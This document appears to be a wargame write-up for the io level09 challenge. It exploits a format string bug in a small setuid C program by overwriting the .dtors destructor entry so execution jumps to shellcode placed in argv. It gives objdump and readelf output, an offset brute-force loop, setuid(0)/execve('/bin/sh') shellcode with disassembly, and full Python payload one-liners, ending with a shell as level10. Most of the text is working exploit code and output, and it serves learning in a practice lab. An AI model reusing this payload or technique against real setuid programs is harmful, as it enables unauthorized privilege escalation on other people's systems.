#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
	int  pad = 0xbabe;
	char buf[1024];
	strncpy(buf, argv[1], sizeof(buf) - 1);

	printf(buf);       <----------- 
	
	return 0;
}

All binaries compiled with gcc on linux have .dtors section. 
This section has an array of functions that will be called when main function exits.
We going to use format string vulnerability and write address of argv in .dtors section. 
Our argv gone contain shellcode

> objdump -h ./level09
./level09:     file format elf32-i386
Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .interp       00000013  08048114  08048114  00000114  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .note.ABI-tag 00000020  08048128  08048128  00000128  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  2 .hash         0000002c  08048148  08048148  00000148  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .dynsym       00000060  08048174  08048174  00000174  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  4 .dynstr       00000054  080481d4  080481d4  000001d4  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .gnu.version  0000000c  08048228  08048228  00000228  2**1
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  6 .gnu.version_r 00000020  08048234  08048234  00000234  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  7 .rel.dyn      00000008  08048254  08048254  00000254  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  8 .rel.plt      00000020  0804825c  0804825c  0000025c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  9 .init         00000030  0804827c  0804827c  0000027c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 10 .plt          00000050  080482ac  080482ac  000002ac  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 11 .text         000001a0  08048300  08048300  00000300  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 12 .fini         0000001c  080484a0  080484a0  000004a0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 13 .rodata       00000008  080484bc  080484bc  000004bc  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 14 .eh_frame     00000004  080484c4  080484c4  000004c4  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 15 .ctors        00000008  080494c8  080494c8  000004c8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 16 .dtors        00000008  080494d0  080494d0  000004d0  2**2  <-------------------------
                  CONTENTS, ALLOC, LOAD, DATA
 17 .jcr          00000004  080494d8  080494d8  000004d8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 18 .dynamic      000000c8  080494dc  080494dc  000004dc  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 19 .got          00000004  080495a4  080495a4  000005a4  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 20 .got.plt      0000001c  080495a8  080495a8  000005a8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 21 .data         0000000c  080495c4  080495c4  000005c4  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 22 .bss          00000004  080495d0  080495d0  000005d0  2**2
                  ALLOC
 23 .comment      000000ee  00000000  00000000  000005d0  2**0
                  CONTENTS, READONLY
 24 .debug_aranges 00000050  00000000  00000000  000006c0  2**3
                  CONTENTS, READONLY, DEBUGGING
 25 .debug_pubnames 00000025  00000000  00000000  00000710  2**0
                  CONTENTS, READONLY, DEBUGGING
 26 .debug_info   0000017f  00000000  00000000  00000735  2**0
                  CONTENTS, READONLY, DEBUGGING
 27 .debug_abbrev 0000006f  00000000  00000000  000008b4  2**0
                  CONTENTS, READONLY, DEBUGGING
 28 .debug_line   00000125  00000000  00000000  00000923  2**0
                  CONTENTS, READONLY, DEBUGGING
 29 .debug_str    000000a3  00000000  00000000  00000a48  2**0
                  CONTENTS, READONLY, DEBUGGING
 30 .debug_ranges 00000040  00000000  00000000  00000af0  2**3
                  CONTENTS, READONLY, DEBUGGING


> readelf -s ./level09
    32: 00000000     0 FILE    LOCAL  DEFAULT  ABS init.c
    33: 00000000     0 FILE    LOCAL  DEFAULT  ABS initfini.c
    34: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    35: 080494c8     0 OBJECT  LOCAL  DEFAULT   16 __CTOR_LIST__
    36: 080494d0     0 OBJECT  LOCAL  DEFAULT   17 __DTOR_LIST__
    37: 080494d8     0 OBJECT  LOCAL  DEFAULT   18 __JCR_LIST__
    38: 080495cc     0 OBJECT  LOCAL  DEFAULT   22 p.0
    39: 080495d0     1 OBJECT  LOCAL  DEFAULT   23 completed.1
    40: 08048330     0 FUNC    LOCAL  DEFAULT   12 __do_global_dtors_aux
    41: 08048370     0 FUNC    LOCAL  DEFAULT   12 frame_dummy
    42: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    43: 080494cc     0 OBJECT  LOCAL  DEFAULT   16 __CTOR_END__
    44: 080494d4     0 OBJECT  LOCAL  DEFAULT   17 __DTOR_END__             
    45: 080484c4     0 OBJECT  LOCAL  DEFAULT   15 __FRAME_END__
    46: 080494d8     0 OBJECT  LOCAL  DEFAULT   18 __JCR_END__
    47: 08048470     0 FUNC    LOCAL  DEFAULT   12 __do_global_ctors_aux
    48: 00000000     0 FILE    LOCAL  DEFAULT  ABS initfini.c
    49: 00000000     0 FILE    LOCAL  DEFAULT  ABS level9.c
    50: 080495a8     0 OBJECT  LOCAL  HIDDEN    21 _GLOBAL_OFFSET_TABLE_
    51: 080494c8     0 NOTYPE  LOCAL  HIDDEN    16 __init_array_end
    52: 080494c8     0 NOTYPE  LOCAL  HIDDEN    16 __init_array_start
    53: 080494dc     0 OBJECT  LOCAL  HIDDEN    19 _DYNAMIC
    54: 080495c4     0 NOTYPE  WEAK   DEFAULT   22 data_start
    55: 08048400     5 FUNC    GLOBAL DEFAULT   12 __libc_csu_fini
    56: 08048300     0 FUNC    GLOBAL DEFAULT   12 _start
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    58: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses
    59: 080484bc     4 OBJECT  GLOBAL DEFAULT   14 _fp_hw
    60: 080484a0     0 FUNC    GLOBAL DEFAULT   13 _fini
    61: 00000000   198 FUNC    GLOBAL DEFAULT  UND strncpy@@GLIBC_2.0
    62: 00000000   441 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    63: 080484c0     4 OBJECT  GLOBAL DEFAULT   14 _IO_stdin_used
    64: 080495c4     0 NOTYPE  GLOBAL DEFAULT   22 __data_start
    65: 080495c8     0 OBJECT  GLOBAL HIDDEN    22 __dso_handle
    66: 08048410    90 FUNC    GLOBAL DEFAULT   12 __libc_csu_init
    67: 00000000    54 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.0
    68: 080495d0     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start
    69: 080495d4     0 NOTYPE  GLOBAL DEFAULT  ABS _end
    70: 080495d0     0 NOTYPE  GLOBAL DEFAULT  ABS _edata
    71: 0804846a     0 FUNC    GLOBAL HIDDEN    12 __i686.get_pc_thunk.bx
    72: 080483a4    81 FUNC    GLOBAL DEFAULT   12 main
    73: 0804827c     0 FUNC    GLOBAL DEFAULT   10 _init
	
> objdump -s -j .dtors level09

level09:     file format elf32-i386

Contents of section .dtors:
 80494d0 ffffffff 00000000                    ........ 

In our case .dtors section's array is empty (ffffffff -start 00000000-end) => level09 does not have any destructor.

> for ((i = 0; i < 350; i++)); do echo -n "$i ->  " && ./level09 "%$i\$s" && echo -n " -> " &&./level09 "%$i\$x"  && echo -n $'\n' ; done

303 ->   -> b7fff920
304 ->  Segmentation fault
305 ->  ./level09 -> bffffe29
306 ->  %306$s -> bffffe33                          <------------------ argv[1] addr
307 ->  (null) -> 0
308 ->  XDG_SESSION_ID=87577 -> bffffe3a
309 ->  TERM=xterm-256color -> bffffe4f
310 ->  SHELL=/bin/bash -> bffffe63
311 ->  OLDPWD=/home/level9 -> bffffe73


We want to overwrite 00000000 from .dtors to argv_addr

argv_addr = 0xbffffe33
dtors_addr = 0x80494d0 + 4


plan: 
dtors_addr -> argv_addr with sc

sc = '\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'  # 33 bytes

0:  31 db                   xor    ebx,ebx
2:  89 d8                   mov    eax,ebx
4:  b0 17                   mov    al,0x17             <--- setuid(0)
6:  cd 80                   int    0x80
10: 31 c0                   xor    eax,eax
12: 50                      push   eax
13: 68 2f 2f 73 68          push   0x68732f2f
18: 68 2f 62 69 6e          push   0x6e69622f
1d: 89 e3                   mov    ebx,esp
1f: 50                      push   eax
20: 53                      push   ebx
21: 89 e1                   mov    ecx,esp
23: 31 d2                   xor    edx,edx
25: b0 0b                   mov    al,0xb              <--- execve
27: cd 80                   int    0x80

Does not work without setuid part


# this way we gone find out addr of argv:
$(python -c "print '\xd4\x94\x04\x08' + '\xd6\x94\x04\x08' + '\x90' * 3 + '\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80%11111x%5\$hx%11111x%4\$hn'")
$(python -c "print '\xd4\x94\x04\x08' + '\xd6\x94\x04\x08' + '\x90' * 3 + '\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80%11111x%4\$hx%1111x%306\$x'")

>./level09 $(python -c "print '\xd4\x94\x04\x08' + '\xd6\x94\x04\x08' + '\x90' * 3 + '\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80%11111x%4\$hx%1111x%306\$x'")
 
3ffbffffdf5level9@io:/levels$ 

=> addr of argv gone be 0xbffffdf5

=> 0x80494d4 -> 0xbffffdf5

0xbffffdf5 (49151  | 65013)
# the longer payload is - the smaller address on stack. we got 4 addr + 4 addr + 3 nops + 33 sc = 44
49151 - 44 = 49107

# we want to jump not at the beginning of argv but after 11 bytes from start of argv (4 addr + 4 addr + 3 nops)
65013 - 49107 = 15906
15906 - 44 + 11 = 15873

#             4 argv_lower      5 argv_higher   
payload = p32(dtors_addr) + p32(dtors_addr + 2)
payload += '%' + str(49107) + 'x%5$hn'
payload += '%' + str(15873) + 'x%4$hn'

$(python -c "print '\xd4\x94\x04\x08' + '\xd6\x94\x04\x08' + '\x90' * 3 + '\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' + '%' + str(49107) + 'x%5\$hn' + '%' + str(15873) + 'x%4\$hn'")


>./level09 $(python -c "print '\xd4\x94\x04\x08' + '\xd6\x94\x04\x08' + '\x90' * 3 + '\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' + '%' + str(49107) + 'x%5\$hn' + '%' + str(15873) + 'x%4\$hn'")

sh-4.3$ whoami
level10




	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	